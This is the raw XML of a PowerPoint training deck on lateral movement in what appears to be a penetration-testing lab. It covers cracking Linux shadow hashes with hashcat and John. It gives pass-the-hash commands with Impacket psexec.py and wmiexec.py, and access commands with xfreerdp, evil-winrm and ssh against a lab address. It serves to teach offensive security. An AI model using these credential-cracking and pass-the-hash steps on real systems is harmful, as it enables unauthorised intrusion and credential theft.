              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/share/wordlists/rockyou.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000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 Unicode MS"/>
              </a:rPr>
              <a:t>-m 1800</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> = SHA-512 (Linux shadow)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/>
              <a:t>Step 4 — View Cracked Passwords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john --show hash.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/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👉 Outcome:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Recovered credentials for reuse </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Key Concept</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Hash </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>≠ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉 You must </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>crack or reuse it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>🔗 How Task 03 connects to Task 02 (VERY IMPORTANT)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Task 02 → Pivot into network</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Task 03 → Dump credentials from Machine1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>           ↓</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use credentials on Machine2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24014874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91380"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 04: Lateral Movement Techniques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91381"/>
            <a:ext cx="12192000" cy="576661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○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use the harvested credentials to gain access to a second </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>internal machine. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Pass-the-Hash (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>PtH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tools (like psexec.py or wmiexec.py) to</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> log into a second Windows machine using only a hash—no password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> required.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Remote Desktop (RDP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xfreerdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> with captured credentials to gain GUI access to an internal target. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>/SSH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use Evil-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Windows) or SSH (Linux) to move laterally </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>across the network. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Understand that "Initial Access" is only the beginning;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> lateral movement is how you reach the "Domain Controller" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>or the "Database."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5376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12287250" cy="68580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Objective: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</a:rPr>
              <a:t>Use harvested NTLM hashes to authenticate to a second Windows machine without knowing the plaintext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password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Big Picture (Attack Chain)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Concept Overview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This task demonstrates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Pass-the-Hash (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PtH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>, where an NTLM hash is used directly as authentication material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instead of a password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Prerequisites</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Valid NTLM hash obtained from Machine A</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Username associated with the hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Network connectivity to Machine B</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Administrative privileges on the target machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Pivoting/tunneling configured (if required), such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>SOCKS proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Proxychains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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34033"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1231899"/>
            <a:ext cx="2876550" cy="1393427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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47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0901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5892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PART 1  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Pass-the-Hash (Windows)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Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>PsExec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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>psexec.py user@192.168.1.10 -hashes :NTLM_HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>OR: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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wmiexec.py user@192.168.1.10 -hashes :NTLM_HASH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What’s happening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>You </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>don’t need the password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NTLM hash = authentication material </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Windows accepts it → you get access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t> PART 2  RDP Access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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>xfreerdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>u:user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>p:password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /v:192.168.1.10 /cert-ignore</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t> (Windows)</a:t>
            </a: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A22858-C332-49E5-87DE-C82FFA93D499}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5892800" y="0"/>
            <a:ext cx="6121400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PART 3 Using Evil-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (Windows Remote Shell):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why this is important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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>evil-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>winrm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.1.10 -u user -p password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>File upload/download </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PowerShell execution </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Very </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>commonin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> real environments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PART 4 — SSH (Linux Lateral Movement)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>
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> user@192.168.1.10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 Outcome:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You now control Machine 2 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="619723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0"/>
            <a:ext cx="11107057" cy="60608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Some Important requirements:-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1.Network access requirements(Critical):-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can only run these if you can reach Machine2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 This ties back to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SOCKS proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Authentication conditions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Pass-the-Hash works only if:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SMB/445 is open </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>NTLM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>auth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is allowed </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Admin privileges (usually required)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721767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3. Tool differences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4.Failure scenarios (realistic labs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>You will face 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Wrong credentials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Blocked ports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Disabled services </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>🔗 How this connects to previous tasks </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Full Lab Chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 01 → Initial foothold</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 02 → Pivot into internal network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 03 → Dump credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 04 → Use credentials to move laterally</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>👉 This is basically a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>real-world breach simulation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30712"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="344527"/>
          <a:ext cx="4884616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2308">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3361799626"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2442308">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4112059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Behavior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1344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psexec.py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Full shell (creates service)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34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wmiexec.py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Semi-interactive shell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187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evil-winrm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PowerShell-based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830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RDP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GUI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3883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9200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Goal:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use harvested credentials to authenticate and gain access to a second </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>internal system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Steps:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. Identify reachable internal targets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Select appropriate protocol (SMB, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>WinRM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, RDP, SSH)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. Authenticate using password or NTLM hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>4. Execute commands or gain interactive access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Outcome:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Successful lateral movement and control of Machine2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Summary:-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 02 → Reach the network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 03 → Steal credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 04 → Use them to take over more machines</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3008286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566" y="0"/>
            <a:ext cx="12074434" cy="68580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1630979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2259</TotalTime>
  <Words>4129</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>655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Arial Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 6</vt:lpstr>
      <vt:lpstr>Week 06: Lateral Movement &amp; Network Pivoting </vt:lpstr>
      <vt:lpstr>Task 01: Internal Network Discovery (Living off the Land)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02: Pivoting &amp; Tunneling (The "Double Jump")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● Task 03: Credential Dumping &amp; Harvesting </vt:lpstr>
      <vt:lpstr>🔐 Task 03: Credential Dumping &amp; Harvesting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04: Lateral Movement Techniques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</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>ad afda</cp:lastModifiedBy>
  <cp:revision>115</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-31T06:02:38Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-26T16:24:40Z</dcterms:modified>
</cp:coreProperties>
</file>